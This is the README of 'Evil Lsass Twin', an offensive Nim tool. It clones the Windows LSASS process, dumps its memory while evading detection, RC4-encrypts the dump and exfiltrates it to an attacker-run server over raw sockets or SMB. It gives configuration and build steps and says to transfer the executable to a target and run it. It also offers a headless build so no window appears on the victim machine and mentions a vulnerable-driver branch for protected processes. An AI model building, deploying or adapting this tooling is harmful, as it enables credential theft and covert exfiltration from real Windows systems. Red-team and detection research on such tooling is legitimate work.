# Evil Lsass Twin
Originally, a port of the [Dirty Vanity](https://github.com/deepinstinct/Dirty-Vanity) project to fork and dump the LSASS process. Has been updated upon further research to attempt to duplicate open handles to LSASS. If this fails (and it likely will), it will attempt to obtain a handle to LSASS through the `NtGetNextProcess` function instead of `OpenProcess`/`NtOpenProcess`. 

Nim, by default (or rather the Winim module) makes use of dynamic function resolution for Windows API functions, ~~so the IAT should only include a reference to GetProcAddress and LoadLibrary (for better or worse)~~ so the IAT will only contain certain functions standard across all Nim executables.

The process cloning functionality has been updated to use make use of `NtCreateProcessEx` instead of `RtlCreateProcessReflection` as this only requires `PROCESS_CREATE_PROCESS` and does not create an initial thread (thereby triggering process creation kernel callbacks). 

Partial implementation of Process Ghosting technique is included to make use of the Delete On Close functionality. 

How this works: 
1. `MiniDumpWriteDump` function is used to dump forked LSASS process's memory into a file on-disk.
2. File is marked with Delete on Close and does not allow other threads to access it simultaneously.
3. File is mapped into memory
4. File is deleted after open handle to it is closed
5. Mapped Data (memory dump) is encrypted and saved to disk *or* sent to server

This will only occur if the tool is set to use the standard Win32 `MiniDumpWriteDump` API function. By default, EvilLsassTwin uses a custom minidump function that will keep the data in memory unless set to save to disk. This allows EvilLsassTwin to keep the dump size to a minimum. 

Requires the `winim` and `ptr_math` modules. Several IOCs and opportunities for detection since this simple port was not originally built with stealth in mind. However, as noted above, this project _does_ include some stealthy features. 

Tested on Windows 10 22H2 and Windows 11 with Defender enabled (Cloud Analysis disabled).

Must be run from an Administrator Command Prompt or Powershell as EvilLsassTwin depends on `SeDebugPrivilege`. 

_Note: SeDebugPrvilege is enabled by default on Elevated Powershell._

_Note: Tool will **not** work against PPL (try the PPL branch) or Credential Guard. Tool also will not work when EDRs patch LSASS a la [Cortex XDR Modifications](https://www.paloaltonetworks.com/blog/security-operations/detecting-credential-stealing-with-cortex-xdr/)_

# Usage
This project was developed and tested with Nim 1.6.10 and 1.6.14. It is **not** compatible with Nim 2.0.

1. Install Dependencies with `nim dependencies` or through Nimble package manager (Atlas not yet tested)
2. Configure settings from lines 15 to 25. Settings include Server IP and Port, SMB Share Name, saving to disk, minidump method (*set to either **useCustom** or **useTraditional***), and exfil method (*set to either **useRaw** or **useSMB***)
4. Compile the project with `nim build`. _Note: this assumes EvilTwinServer will be run on a Linux machine. Manual compilation required otherwise_
5. If **not** set to save to file: `chmod +x EvilTwinServer && ./EvilTwinServer`
6. Transfer EvilLsassTwin.exe to (Windows) target machine and Run.

# Why's
## Why RC4?
Simplicity. A simple call to `SystemFunction032` is all it takes to implement. Nothing else to code. Entropy isn't sky-high. And it's good enough.

## Why code changes instead of command-line parameters?
First, I don't like Nim's command-line parsing options. Second, if you can't make those simple changes to the code, you probably shouldn't be using this. Third, no command-line parameters means no need for command-line spoofing.

## Why Nim?
I wrote an entire blog post about this. See: [Why Nim? - RePRGM](https://reprgm.github.io/2023/02/13/why-nim/)

## Why a PPL branch?
BYOVD is a cool technique but it has it's downsides. For one, the vulnerable driver is included in and extracted from the `EvilLsassTwin` executable to make things simpler. Those bytes could be flagged by AV/EDR. The vulnerable driver itself is also on the Microsoft Driver Blocklist so that is another potential issue. Not to mention, an unknown executable is attempting to install a known-vulnerable driver. Then, there's the file creation for the driver and the subsequent creation of a (driver) service. 

So, yeah. High-risk, high-reward. I thought it would be better to keep all of that in a separate branch.

# Important Notes
By default, EvilLsassTwin *will* use RC4 to encrypt the dump and display the encryption key in hexadecimal in the console. EvilTwinServer will attempt to decrypt the dump file automatically for you. However, if this fails, you will have to decrypt the file yourself. This can be done with OpenSSL. Take note of the command used in either the terminal (if running) or in the `EvilTwinServer.nim` file!

Alternatively, if you **don't** want a console screen popping up on the target machine, a "headless" build can be done. Take note of the build command in the `config.nims` file and add option `--app:gui`. Doing so will require you to either use EvilTwinServer or create a custom script/application. This is due to EvilLsassTwin sending the encryption key and then the dump in that order. Should another application be used without modification to the `EvilLsassTwin.nim` file, both encryption key and data are likely to be included in the same file, rendering the dump file useless without even further modification. 

EvilTwinServer is **not** required with a standard build. With a simple change to the `EvilLsassTwin.nim` file, another application may be used to receive the encrypted dump file. To do so, simply comment out or remove the following lines: 
```nim
echo "[!] Sending Encryption Key to Server..."
        if not socket.trySend(rc4KeyStr):
            echo "[-] Could Not Send Encryption Key to Server!"
```

Lastly, the custom minidump function is not complete as of now. This means **only** NTLM hashes will be found by tools such as Mimikatz and Pypykatz. For anything else, you will need to configure the tool to use the `MiniDumpWriteDump` function which also will result in large (~50+ MB) dump files. It is because this custom function is not complete that the option to use the traditional API function is there.

# Resources
[Bill Demirkapi - Abusing Windows Implemention of Fork for Stealthy Memory Operations](https://billdemirkapi.me/abusing-windows-implementation-of-fork-for-stealthy-memory-operations/)

[Dirty Vanity](https://github.com/deepinstinct/Dirty-Vanity)

[TransactedSharpMiniDump](https://github.com/PorLaCola25/TransactedSharpMiniDump/tree/master)

[Rasta Mouse - Dumping LSASS with Duplicated Handles](https://rastamouse.me/dumping-lsass-with-duplicated-handles/)

[Rasta Mouse - Duplicating Handles in C#](https://rastamouse.me/duplicating-handles-in-csharp/)

[Splintercod3 - The Hidden Side of Seclogon - Part 2](https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-2.html)

[Diversenok - The Definitive Guide to Process Cloning on Windows](https://diversenok.github.io/2023/04/20/Process-Cloning.html)

[NativeDump](https://github.com/ricardojoserf/NativeDump)

[NanoDump](https://github.com/fortra/nanodump)
